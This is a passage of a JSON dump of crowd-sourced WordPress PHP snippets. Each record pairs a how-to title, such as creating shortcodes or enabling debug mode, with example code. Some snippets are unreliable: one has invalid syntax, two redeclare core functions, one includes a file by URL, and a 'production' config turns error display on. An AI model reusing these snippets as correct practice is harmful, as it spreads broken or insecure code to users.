\t\t'items_list_navigation' => __( 'Items list navigation', 'text_domain' ), \t\t'filter_items_list'     => __( 'Filter items list', 'text_domain' ), \t); \t$args = array( \t\t'label'                 => __( 'Post Type', 'text_domain' ), \t\t'description'           => __( 'Post Type Description', 'text_domain' ), \t\t'labels'                => $labels, \t\t'supports'              => false, \t\t'taxonomies'            => array( 'category', 'post_tag' ), \t\t'hierarchical'          => false, \t\t'public'                => true, \t\t'show_ui'               => true, \t\t'show_in_menu'          => true, \t\t'menu_position'         => 5, \t\t'show_in_admin_bar'     => true, \t\t'show_in_nav_menus'     => true, \t\t'can_export'            => true, \t\t'has_archive'           => true, \t\t'exclude_from_search'   => false, \t\t'publicly_queryable'    => true, \t\t'capability_type'       => 'page', \t); \tregister_post_type( 'post_type', $args );  } add_action( 'init', 'custom_post_type', 0 );\n<?php      query_posts(array(          'post_type' => 'portfolio',         'showposts' => 10      ) );   ?> <?php while (have_posts()) : the_post(); ?>         <h2><a href=\"<?php the_permalink() ?>\"><?php the_title(); ?></a></h2>         <p><?php echo get_the_excerpt(); ?></p> <?php endwhile;?> \n",
    "reg_date": "2021-10-12T10:21:04.000Z"
  },
  {
    "id": 5153,
    "keyword": null,
    "link": null,
    "title": " wordpress create shortcode",
    "description": "function create_shortcode(){     return \"<h2>Hello world !</h2>\"; } add_shortcode('my_shortcode', 'create_shortcode'); // Use [my_shortcode]\nfunction wpdocs_bartag_func( $atts ) {     $atts = shortcode_atts(         array(             'foo' => 'no foo',             'bar' => 'default bar',         ), $atts, 'bartag' );       return 'bartag: ' . esc_html( $atts['foo'] ) . ' ' . esc_html( $atts['bar'] ); } add_shortcode( 'bartag', 'wpdocs_bartag_func' );\n<?php echo do_shortcode('[name_of_shortcode parameters=\"\"]'); ?>\nfunction wp_demo_shortcode() {   //Turn on output buffering ob_start(); $code = 'Hello World'; ob_get_clean();   // Output needs to be return return $code; }   // register shortcode add_shortcode('helloworld', 'wp_demo_shortcode'); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode'); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode');  \n",
    "reg_date": "2021-10-12T10:21:04.000Z"
  },
  {
    "id": 5154,
    "keyword": null,
    "link": null,
    "title": " wordpress custom fields variable dump",
    "description": "echo '<pre>'; \tprint_r(get_post_custom($post_id)); echo '</pre>';\n",
    "reg_date": "2021-10-12T10:21:04.000Z"
  },
  {
    "id": 5155,
    "keyword": null,
    "link": null,
    "title": " wordpress custom php use wp query",
    "description": "if ( ! defined('ABSPATH') ) {     /** Set up WordPress environment */     require_once( dirname( __FILE__ ) . '/wp-load.php' ); }  global $wpdb; $results = $wpdb->get_results( \"SELECT * FROM {$wpdb->prefix}options WHERE option_id = 1\", OBJECT );\n",
    "reg_date": "2021-10-12T10:21:04.000Z"
  },
  {
    "id": 5156,
    "keyword": null,
    "link": null,
    "title": " wordpress debug config",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );  // Use dev versions of core JS and CSS files (only needed if you are modifying these core files) define( 'SCRIPT_DEBUG', true );\n// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );\n",
    "reg_date": "2021-10-12T10:21:04.000Z"
  },
  {
    "id": 5157,
    "keyword": null,
    "link": null,
    "title": " wordpress debug mode",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );  // Use dev versions of core JS and CSS files (only needed if you are modifying these core files) define( 'SCRIPT_DEBUG', true );\n// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );\ndefine( 'WP_DEBUG', true ); \n// This enables debugging. define( 'WP_DEBUG', true );\nini_set('log_errors','On');  ini_set('display_errors','Off');  ini_set('error_reporting', E_ALL );  define('WP_DEBUG', false);  define('WP_DEBUG_LOG', true);  define('WP_DEBUG_DISPLAY', false); \nwordpress debug\n",
    "reg_date": "2021-10-12T10:21:04.000Z"
  },
  {
    "id": 5158,
    "keyword": null,
    "link": null,
    "title": " wordpress debug mode enabled",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );  // Use dev versions of core JS and CSS files (only needed if you are modifying these core files) define( 'SCRIPT_DEBUG', true );\n// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );\n// This enables debugging. define( 'WP_DEBUG', true );\nwordpress debug\n",
    "reg_date": "2021-10-12T10:21:04.000Z"
  },
  {
    "id": 5159,
    "keyword": null,
    "link": null,
    "title": " wordpress define constant if not defined",
    "description": "<?php define(\"AMOUNT_OF_APPLES\", 12); if(defined(\"AMOUNT_OF_APPLES\")){    //here you go    echo AMOUNT_OF_APPLES; }  //output: 12 ?>\n",
    "reg_date": "2021-10-12T10:21:04.000Z"
  },
  {
    "id": 5160,
    "keyword": null,
    "link": null,
    "title": " wordpress define template name",
    "description": "/*           make this file in template-parts folder                   give file name as category_post.php        */  <?php /**  * Template Name: Category Custom Page  */   get_header(); ?>   <div id=\"primary\" class=\"content-area\">     <main id=\"main\" class=\"site-main\" role=\"main\">       <?php     $args = array(         'post_type' => 'post',         'post_status' => 'publish',         'category_name' => 'wordpress',         'posts_per_page' => 5,     );     $arr_posts = new WP_Query( $args );       if ( $arr_posts->have_posts() ) :           while ( $arr_posts->have_posts() ) :             $arr_posts->the_post();             ?>             <article id=\"post-<?php the_ID(); ?>\" <?php post_class(); ?>>                 <?php                 if ( has_post_thumbnail() ) :                     the_post_thumbnail();                 endif;                 ?>                 <header class=\"entry-header\">                     <h1 class=\"entry-title\"><?php the_title(); ?></h1>                 </header>                 <div class=\"entry-content\">                     <?php the_excerpt(); ?>                     <a href=\"<?php the_permalink(); ?>\">Read More</a>                 </div>             </article>             <?php         endwhile;         wp_pagenavi(             array(                 'query' => $arr_posts,             )         );     endif;     ?>       </main><!-- .site-main --> </div><!-- .content-area -->   <?php get_footer(); ?>\n/*on top of Php file add the below line to make as custom template*/  <?php /* Template Name: Custom template name */ ?>\n",
    "reg_date": "2021-10-12T10:21:05.000Z"
  },
  {
    "id": 5161,
    "keyword": null,
    "link": null,
    "title": " wordpress disable edit files",
    "description": "//Add inside wp-config.php: define('DISALLOW_FILE_EDIT', true);\n",
    "reg_date": "2021-10-12T10:21:05.000Z"
  },
  {
    "id": 5162,
    "keyword": null,
    "link": null,
    "title": " wordpress disable editor",
    "description": "//Add inside wp-config.php: define('DISALLOW_FILE_EDIT', true);\n// On wp-config.php define( 'DISALLOW_FILE_EDIT', true );\n",
    "reg_date": "2021-10-12T10:21:05.000Z"
  },
  {
    "id": 5163,
    "keyword": null,
    "link": null,
    "title": " wordpress disable theme editor",
    "description": "// On wp-config.php define( 'DISALLOW_FILE_EDIT', true );\n",
    "reg_date": "2021-10-12T10:21:05.000Z"
  },
  {
    "id": 5164,
    "keyword": null,
    "link": null,
    "title": " wordpress disable xmlrpc",
    "description": "/* Disable WordPress XML-RPC for better security */ add_filter('xmlrpc_enabled', '__return_false');\n",
    "reg_date": "2021-10-12T10:21:05.000Z"
  },
  {
    "id": 5165,
    "keyword": null,
    "link": null,
    "title": " wordpress display all variables",
    "description": "echo '<pre>'; \tprint_r(get_post_custom($post_id)); echo '</pre>';\n",
    "reg_date": "2021-10-12T10:21:05.000Z"
  },
  {
    "id": 5166,
    "keyword": null,
    "link": null,
    "title": " wordpress display post categories",
    "description": "<?php the_terms( $post->ID, 'topics', 'Topics: ', ', ', ' ' ); ?>\n",
    "reg_date": "2021-10-12T10:21:06.000Z"
  },
  {
    "id": 5167,
    "keyword": null,
    "link": null,
    "title": " wordpress display post comment number",
    "description": "<?php   // https://developer.wordpress.org/reference/functions/comments_number/   function comments_number( $zero = false, $one = false, $more = false, $post_id = 0 ) {       echo get_comments_number_text( $zero, $one, $more, $post_id );   } ?>  <span>   <i class=\"far fa-comment text-info\"></i>  \t  <?php comments_number(); ?> </span>  \n",
    "reg_date": "2021-10-12T10:21:06.000Z"
  },
  {
    "id": 5168,
    "keyword": null,
    "link": null,
    "title": " wordpress do shortcode",
    "description": "echo do_shortcode('[name_of_shortcode]');\n<?php echo do_shortcode('[name_of_shortcode]'); ?> \nfunction create_shortcode(){     return \"<h2>Hello world !</h2>\"; } add_shortcode('my_shortcode', 'create_shortcode'); // Use [my_shortcode]\n<?php echo do_shortcode('[name_of_shortcode parameters=\"\"]'); ?>\nfunction wpdocs_bartag_func( $atts ) {     $atts = shortcode_atts(         array(             'foo' => 'no foo',             'bar' => 'default bar',         ), $atts, 'bartag' );       return 'bartag: ' . esc_html( $atts['foo'] ) . ' ' . esc_html( $atts['bar'] ); } add_shortcode( 'bartag', 'wpdocs_bartag_func' );\nfunction wp_demo_shortcode() {   //Turn on output buffering ob_start(); $code = 'Hello World'; ob_get_clean();   // Output needs to be return return $code; }   // register shortcode add_shortcode('helloworld', 'wp_demo_shortcode'); \n",
    "reg_date": "2021-10-12T10:21:06.000Z"
  },
  {
    "id": 5169,
    "keyword": null,
    "link": null,
    "title": " wordpress echo the date in post",
    "description": "<?php echo get_the_date( 'l F j, Y' ); ?>\n$post_date = get_the_date( 'D M j' ); echo $post_date; \n$post_date = get_the_date( 'l F j, Y' ); echo $post_date; \n",
    "reg_date": "2021-10-12T10:21:06.000Z"
  },
  {
    "id": 5170,
    "keyword": null,
    "link": null,
    "title": " wordpress echo the excerpt",
    "description": "<?php the_excerpt(); ?> \n",
    "reg_date": "2021-10-12T10:21:06.000Z"
  },
  {
    "id": 5171,
    "keyword": null,
    "link": null,
    "title": " wordpress echo the page title",
    "description": " <?php echo get_the_title(post->$ID); ?>  \n",
    "reg_date": "2021-10-12T10:21:06.000Z"
  },
  {
    "id": 5172,
    "keyword": null,
    "link": null,
    "title": " wordpress embed shortcode in php",
    "description": "echo do_shortcode('[name_of_shortcode]');\n<?php echo do_shortcode('[name_of_shortcode]'); ?> \n<?php echo do_shortcode(\"[insert-your-shortcode-here]\"); ?> \n",
    "reg_date": "2021-10-12T10:21:06.000Z"
  },
  {
    "id": 5173,
    "keyword": null,
    "link": null,
    "title": " wordpress enqueue style child theme",
    "description": "// To enqueue the WordPress way your CSS sources // INSIDE your theme/child functions.php:  function wp_starter_scripts() { \twp_enqueue_style( 'wp-style-menu', get_template_directory_uri() . '/style-menu.css' ); \twp_enqueue_style( 'wp-style-buttons', get_template_directory_uri() . '/style-buttons.css' ); \twp_enqueue_style( 'wp-style-footer', get_template_directory_uri() . '/style-footer.css' );   } add_action( 'wp_enqueue_scripts', 'wp_starter_scripts' );\n",
    "reg_date": "2021-10-12T10:21:06.000Z"
  },
  {
    "id": 5174,
    "keyword": null,
    "link": null,
    "title": " wordpress error enable",
    "description": "//Add develop or production config on your wordpress /wp-config.php file  //DEVELOP CONFIG  @ini_set( 'log_errors', 'On' ); @ini_set( 'display_errors', 'On' ); define( 'WP_DEBUG', true ); define( 'WP_DEBUG_LOG', true ); define( 'WP_DEBUG_DISPLAY', true ); define( 'SCRIPT_DEBUG', true );  // PRODUCTION CONFIG @ini_set( 'log_errors', 'On' ); @ini_set( 'display_errors', 'On' ); define( 'WP_DEBUG', false ); define( 'WP_DEBUG_LOG', false ); define( 'WP_DEBUG_DISPLAY', false ); define( 'SCRIPT_DEBUG', false );\n",
    "reg_date": "2021-10-12T10:21:06.000Z"
  },
  {
    "id": 5175,
    "keyword": null,
    "link": null,
    "title": " wordpress escape for html",
    "description": "// Escaping for HTML attributes. esc_attr( string $text )\n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5176,
    "keyword": null,
    "link": null,
    "title": " wordpress escape string",
    "description": "// Adds slashes to escape strings. addslashes_gpc( string $gpc )\n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5177,
    "keyword": null,
    "link": null,
    "title": " wordpress exclude current post from loop",
    "description": "$args = array(     'numberposts' => 5,     'offset' => 0,     'category' => 7,     'post__not_in' => array( $post->ID ) ); $myposts2 = get_posts($args);\n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5178,
    "keyword": null,
    "link": null,
    "title": " wordpress execute query",
    "description": "global $wpdb;     $result = $wpdb->get_results( \"SELECT * FROM wp_usermeta WHERE meta_key = 'points' AND user_id = '1'\"); print_r($result);\n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5179,
    "keyword": null,
    "link": null,
    "title": " wordpress featured image as a background image",
    "description": "<?php   \tif ( has_post_thumbnail() ) {     \t$image_b1 = get_the_post_thumbnail_url();   \t} \telse {   \t\t$image_b1 = get_stylesheet_directory_uri().'/images/noimage.png'; \t} ?>     <div style=\"background-image: url(<?php echo $image_b1; ?>);\">\n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5180,
    "keyword": null,
    "link": null,
    "title": " wordpress featured image show",
    "description": "<?php echo the_post_thumbnail(); ?>\n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5181,
    "keyword": null,
    "link": null,
    "title": " wordpress fs method direct",
    "description": "#Add inside wp-config.php    define('FS_METHOD','direct');\n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5182,
    "keyword": null,
    "link": null,
    "title": " wordpress functions add to header",
    "description": "/* INSIDE YOUR functions.php theme file -> Add to header some code */ add_action('wp_head', 'your_function_name'); function your_function_name(){ ?> PASTE HEADER CODE HERE <?php };\n/* INSIDE functions.php */ /* Describe what the code snippet does so you can remember later on */ add_action('wp_head', 'your_function_name'); function your_function_name(){ ?> PASTE HEADER CODE HERE <?php };\n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5183,
    "keyword": null,
    "link": null,
    "title": " wordpress get archive title",
    "description": "-the_archive_title(): you can just use this one function to do the work of is_Category() and is_Author() functions automatically. It displays the archive title based on the queried object. so you dont need to put the if and else conditions for each archive title. it will simply get the archive title from the url based on the user selection. \n$archive_title = get_the_archive_title()  // * Filters the archive title prefix. // apply_filters( 'get_the_archive_title_prefix', $prefix );  // * Filters the archive title. // apply_filters( 'get_the_archive_title', $title, $original_title, $prefix ); \n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5184,
    "keyword": null,
    "link": null,
    "title": " wordpress get current taxonomy",
    "description": "<?php $current_term = get_queried_object()->term_id; ?>\n$term = get_term_by( 'slug', get_query_var( 'term' ), get_query_var( 'taxonomy' ) ); echo $term->name; // will show the name echo $term->slug; // will show the slug\nYou need to pass an additional argument to get_terms(). The default is to hide \"empty\" terms-- terms which are assigned to no posts.  $terms = get_terms([     'taxonomy' => $taxonomy,     'hide_empty' => false, ]);\n$obj = get_queried_object(); echo $obj->term_id;\n",
    "reg_date": "2021-10-12T10:21:07.000Z"
  },
  {
    "id": 5185,
    "keyword": null,
    "link": null,
    "title": " wordpress get current user role",
    "description": "$user = wp_get_current_user(); if ( in_array( 'author', (array) $user->roles ) ) {     //The user has the \"author\" role }\n",
    "reg_date": "2021-10-12T10:21:08.000Z"
  },
  {
    "id": 5186,
    "keyword": null,
    "link": null,
    "title": " wordpress get date",
    "description": "<?php echo get_the_date( 'l F j, Y' ); ?>\n",
    "reg_date": "2021-10-12T10:21:08.000Z"
  },
  {
    "id": 5187,
    "keyword": null,
    "link": null,
    "title": " wordpress get domain",
    "description": "// WORDPRESS GET SITE URL: echo get_site_url(); // echo's http://www.yoursitename.com\n",
    "reg_date": "2021-10-12T10:21:08.000Z"
  },
  {
    "id": 5188,
    "keyword": null,
    "link": null,
    "title": " wordpress get fiture image",
    "description": "if ( has_post_thumbnail()) {    $large_image_url = wp_get_attachment_image_src( get_post_thumbnail_id(), 'large');    echo '<a href=\"' . $large_image_url[0] . '\">';    the_post_thumbnail('thumbnail');    echo '</a>'; } \n<?php if (has_post_thumbnail( $post->ID ) ): ?>   <?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); ?>   <div id=\"custom-bg\" style=\"background-image: url('<?php echo $image[0]; ?>')\">    </div> <?php endif; ?>\n<?php \techo get_the_post_thumbnail( $post_id, 'thumbnail' ); ?>\n",
    "reg_date": "2021-10-12T10:21:08.000Z"
  },
  {
    "id": 5189,
    "keyword": null,
    "link": null,
    "title": " wordpress get link to post by id",
    "description": "get_permalink();\nYou just need to use get_permalink( $id ) or get_the_title( $id )\n",
    "reg_date": "2021-10-12T10:21:08.000Z"
  },
  {
    "id": 5190,
    "keyword": null,
    "link": null,
    "title": " wordpress get option value",
    "description": "$no_exists_value = get_option( 'no_exists_value' ); var_dump( $no_exists_value ); /* outputs false */   $no_exists_value = get_option( 'no_exists_value', 'default_value' ); var_dump( $no_exists_value ); /* outputs 'default_value' */ \n$reg = get_option('region')\n",
    "reg_date": "2021-10-12T10:21:08.000Z"
  },
  {
    "id": 5191,
    "keyword": null,
    "link": null,
    "title": " wordpress get page slug",
    "description": "// Get the queried object and sanitize it $current_page = sanitize_post( $GLOBALS['wp_the_query']->get_queried_object() ); // Get the page slug $slug = $current_page->post_name; \n",
    "reg_date": "2021-10-12T10:21:08.000Z"
  },
  {
    "id": 5192,
    "keyword": null,
    "link": null,
    "title": " wordpress get perma link",
    "description": "// Retrieves the full permalink for the current post or post ID. get_permalink( int|WP_Post $post, bool $leavename = false )\n",
    "reg_date": "2021-10-12T10:21:08.000Z"
  },
  {
    "id": 5193,
    "keyword": null,
    "link": null,
    "title": " wordpress get permalink",
    "description": "// Get post permalink (you can use it inside a wp_query loop) <?php the_permalink(); ?> // or <?php $link = get_the_permalink(); ?>\nget_permalink();\n<a href=\"<?php the_permalink(); ?>\">permalink</a> \n",
    "reg_date": "2021-10-12T10:21:08.000Z"
  },
  {
    "id": 5194,
    "keyword": null,
    "link": null,
    "title": " wordpress get post body",
    "description": "<?php echo get_the_content();  ?>\n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5195,
    "keyword": null,
    "link": null,
    "title": " wordpress get post by id",
    "description": "// Retrieve the ID of the current item in the WordPress Loop. get_the_ID()\nget_post( $post_id )->post_title\n$post   = get_post( 123 ); // Where 123 is the ID $output =  apply_filters( 'the_content', $post->post_content );\nurl_to_postid( site_url('the_slug') ); \n//WordPress: Query a specific post by its post type & ID //For example, query Case Study with ID #12345  <?php query_posts('post_type=case_studies&p=12345'); ?>    /*To determine a post ID, refer to the URL of the post while editing it: http://localhost...wp-admin/post.php?post=12345...*/\n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5196,
    "keyword": null,
    "link": null,
    "title": " wordpress get post id",
    "description": "// Retrieve the ID of the current item in the WordPress Loop. get_the_ID()\nfunction get_the_ID() { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.FunctionNameInvalid     $post = get_post();     return ! empty( $post ) ? $post->ID : false; } \n$post   = get_post( 123 ); // Where 123 is the ID $output =  apply_filters( 'the_content', $post->post_content );\nget_posts(array(     'fields'          => 'ids', // Only get post IDs     'posts_per_page'  => -1 )); \nurl_to_postid( site_url('the_slug') ); \n//WordPress: Query a specific post by its post type & ID //For example, query Case Study with ID #12345  <?php query_posts('post_type=case_studies&p=12345'); ?>    /*To determine a post ID, refer to the URL of the post while editing it: http://localhost...wp-admin/post.php?post=12345...*/\n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5197,
    "keyword": null,
    "link": null,
    "title": " wordpress get post slug",
    "description": "<?php     global $post;     $post_slug = $post->post_name; ?> \n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5198,
    "keyword": null,
    "link": null,
    "title": " wordpress get post thumbnail",
    "description": "<?php    // ALL parameters are optional. Not needed if you are on WP LOOP   echo get_the_post_thumbnail_url( $the_query->ID, array( 500, 400) ); ?>\n<?php if (has_post_thumbnail( $post->ID ) ): ?>   <?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); ?>   <div id=\"custom-bg\" style=\"background-image: url('<?php echo $image[0]; ?>')\">    </div> <?php endif; ?>\n<?php \techo get_the_post_thumbnail( $post_id, 'thumbnail' ); ?>\n<?php  /* RETURNS a full image resource as: <img class=\"data...\" src=\"data...\">    ALL parameters are optional. Not needed if you are on WP LOOP */ echo get_the_post_thumbnail( $the_query->ID, array( 500, 400) );  /* USE get_the_post_thumbnail_url() to get only the image url */ ?>\n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5199,
    "keyword": null,
    "link": null,
    "title": " wordpress get post thumbnail url",
    "description": "echo get_the_post_thumbnail_url();\n<?php    // ALL parameters are optional. Not needed if you are on WP LOOP   echo get_the_post_thumbnail_url( $the_query->ID, array( 500, 400) ); ?>\n<?php if (has_post_thumbnail( $post->ID ) ): ?>   <?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); ?>   <div id=\"custom-bg\" style=\"background-image: url('<?php echo $image[0]; ?>')\">    </div> <?php endif; ?> \n<img src='<?php the_post_thumbnail_url(); ?>'>\n<?php  /* RETURNS a full image resource as: <img class=\"data...\" src=\"data...\">    ALL parameters are optional. Not needed if you are on WP LOOP */ echo get_the_post_thumbnail( $the_query->ID, array( 500, 400) );  /* USE get_the_post_thumbnail_url() to get only the image url */ ?>\n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5200,
    "keyword": null,
    "link": null,
    "title": " wordpress get post time",
    "description": "// Retrieve the time at which the post was written. get_the_time( string $format = '', int|WP_Post $post = null )\n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5201,
    "keyword": null,
    "link": null,
    "title": " wordpress get post type",
    "description": "if ( get_post_type( get_the_ID() ) == 'slug_post_type' ) {     //if is true } \n/**  * Register a custom post type called \"book\".  *  * @see get_post_type_labels() for label keys.  */ function wpdocs_codex_book_init() {     $labels = array(         'name'                  => _x( 'Books', 'Post type general name', 'textdomain' ),         'singular_name'         => _x( 'Book', 'Post type singular name', 'textdomain' ),         'menu_name'             => _x( 'Books', 'Admin Menu text', 'textdomain' ),         'name_admin_bar'        => _x( 'Book', 'Add New on Toolbar', 'textdomain' ),         'add_new'               => __( 'Add New', 'textdomain' ),         'add_new_item'          => __( 'Add New Book', 'textdomain' ),         'new_item'              => __( 'New Book', 'textdomain' ),         'edit_item'             => __( 'Edit Book', 'textdomain' ),         'view_item'             => __( 'View Book', 'textdomain' ),         'all_items'             => __( 'All Books', 'textdomain' ),         'search_items'          => __( 'Search Books', 'textdomain' ),         'parent_item_colon'     => __( 'Parent Books:', 'textdomain' ),         'not_found'             => __( 'No books found.', 'textdomain' ),         'not_found_in_trash'    => __( 'No books found in Trash.', 'textdomain' ),         'featured_image'        => _x( 'Book Cover Image', 'Overrides the &ldquo;Featured Image&rdquo; phrase for this post type. Added in 4.3', 'textdomain' ),         'set_featured_image'    => _x( 'Set cover image', 'Overrides the &ldquo;Set featured image&rdquo; phrase for this post type. Added in 4.3', 'textdomain' ),         'remove_featured_image' => _x( 'Remove cover image', 'Overrides the &ldquo;Remove featured image&rdquo; phrase for this post type. Added in 4.3', 'textdomain' ),         'use_featured_image'    => _x( 'Use as cover image', 'Overrides the &ldquo;Use as featured image&rdquo; phrase for this post type. Added in 4.3', 'textdomain' ),         'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default &ldquo;Post Archives&rdquo;. Added in 4.4', 'textdomain' ),         'insert_into_item'      => _x( 'Insert into book', 'Overrides the &ldquo;Insert into post&rdquo;/&rdquo;Insert into page&rdquo; phrase (used when inserting media into a post). Added in 4.4', 'textdomain' ),         'uploaded_to_this_item' => _x( 'Uploaded to this book', 'Overrides the &ldquo;Uploaded to this post&rdquo;/&rdquo;Uploaded to this page&rdquo; phrase (used when viewing media attached to a post). Added in 4.4', 'textdomain' ),         'filter_items_list'     => _x( 'Filter books list', 'Screen reader text for the filter links heading on the post type listing screen. Default &ldquo;Filter posts list&rdquo;/&rdquo;Filter pages list&rdquo;. Added in 4.4', 'textdomain' ),         'items_list_navigation' => _x( 'Books list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default &ldquo;Posts list navigation&rdquo;/&rdquo;Pages list navigation&rdquo;. Added in 4.4', 'textdomain' ),         'items_list'            => _x( 'Books list', 'Screen reader text for the items list heading on the post type listing screen. Default &ldquo;Posts list&rdquo;/&rdquo;Pages list&rdquo;. Added in 4.4', 'textdomain' ),     );       $args = array(         'labels'             => $labels,         'public'             => true,         'publicly_queryable' => true,         'show_ui'            => true,         'show_in_menu'       => true,         'query_var'          => true,         'rewrite'            => array( 'slug' => 'book' ),         'capability_type'    => 'post',         'has_archive'        => true,         'hierarchical'       => false,         'menu_position'      => null,         'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' ),     );       register_post_type( 'book', $args ); }   add_action( 'init', 'wpdocs_codex_book_init' );\n// Retrieves the post type of the current post or of a given post. get_post_type( int|WP_Post|null $post = null )\nA Single Post Page is_single()  When a single post of any post type (except attachment and page post types) is being displayed. is_single( '17' )  When Post 17 is being displayed as a single Post. is_single( 'Irish Stew' )  When the Post with Title \"Irish Stew\" is being displayed as a single Post. is_single( 'beef-stew' )  When the Post with Post Slug \"beef-stew\" is being displayed as a single Post. is_single( array( 17, 'beef-stew', 'Irish Stew' ) )  Returns true when the single post being displayed is either post ID 17, or the post_name is \"beef-stew\", or the post_title is \"Irish Stew\". is_single( array( 17, 19, 1, 11 ) )  Returns true when the single post being displayed is either post ID = 17, post ID = 19, post ID = 1 or post ID = 11. is_single( array( 'beef-stew', 'pea-soup', 'chili' ) )  Returns true when the single post being displayed is either the post_name \"beef-stew\", post_name \"pea-soup\" or post_name \"chili\". is_single( array( 'Beef Stew', 'Pea Soup', 'Chili' ) )  Returns true when the single post being displayed is either the post_title is \"Beef Stew\", post_title is \"Pea Soup\" or post_title is \"Chili\". Note: This function does not distinguish between the post ID, post title, or post name. A post named \"17\" would be displayed if a post ID of 17 was requested. Presumably the same holds for a post with the slug \"17\".\n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5202,
    "keyword": null,
    "link": null,
    "title": " wordpress get taxonomy of a post",
    "description": "<?php $term_obj_list = get_the_terms( $post->ID, 'taxonomy_name' ); ?>\n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5203,
    "keyword": null,
    "link": null,
    "title": " wordpress get template url",
    "description": "// Get template directory example: <img src=\"<?php echo get_template_directory_uri(); ?>/images/logo.png\" />  // If you use child theme you will have to use another function: <img src=\"<?php echo get_stylesheet_directory_uri(); ?>/images/logo.png\" />   \ninclude( get_template_directory_uri() . '/includes/my_file.php' );\n",
    "reg_date": "2021-10-12T10:21:09.000Z"
  },
  {
    "id": 5204,
    "keyword": null,
    "link": null,
    "title": " wordpress get text of wordpress post",
    "description": "<?php  $my_postid = get_the_ID(); // Get Current Page ID or just use the number like 315 //get_the_ID() gets the page/post id of the current page/post. We use it here to make it dynamic in templates / shortcodes $content_post = get_post($my_postid); $content = $content_post->post_content; $content = apply_filters('the_content', $content); $content = str_replace(']]>', ']]>', $content);// Strip Symbols echo $content; // Outputs Content ?> \n",
    "reg_date": "2021-10-12T10:21:10.000Z"
  },
  {
    "id": 5205,
    "keyword": null,
    "link": null,
    "title": " wordpress get theme uri",
    "description": "// Get template directory example: <img src=\"<?php echo get_template_directory_uri(); ?>/images/logo.png\" />  // If you use child theme you will have to use another function: <img src=\"<?php echo get_stylesheet_directory_uri(); ?>/images/logo.png\" />   \ninclude( get_template_directory_uri() . '/includes/my_file.php' );\n<?php echo get_template_directory_uri(); ?>/images/logo.png\">\nadd_action('wp_enqueue_scripts', 'wpdocs_scripts_method');   /*  * Enqueue a script with the correct path.  */ function wpdocs_scripts_method() {     wp_enqueue_script(         'custom_script',         get_template_directory_uri() . '/js/custom_script.js',         array('jquery')     ); } \n",
    "reg_date": "2021-10-12T10:21:10.000Z"
  },
  {
    "id": 5206,
    "keyword": null,
    "link": null,
    "title": " wordpress get user by id",
    "description": "<?php \t$user_id = get_current_user_id(); ?>\n$current_user = wp_get_current_user(); echo($current_user->user_login);\nfunction get_the_ID() { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.FunctionNameInvalid     $post = get_post();     return ! empty( $post ) ? $post->ID : false; } \necho get_the_ID();\n$user_obj = get_user_by('id', 1);\n",
    "reg_date": "2021-10-12T10:21:10.000Z"
  },
  {
    "id": 5207,
    "keyword": null,
    "link": null,
    "title": " wordpress get username",
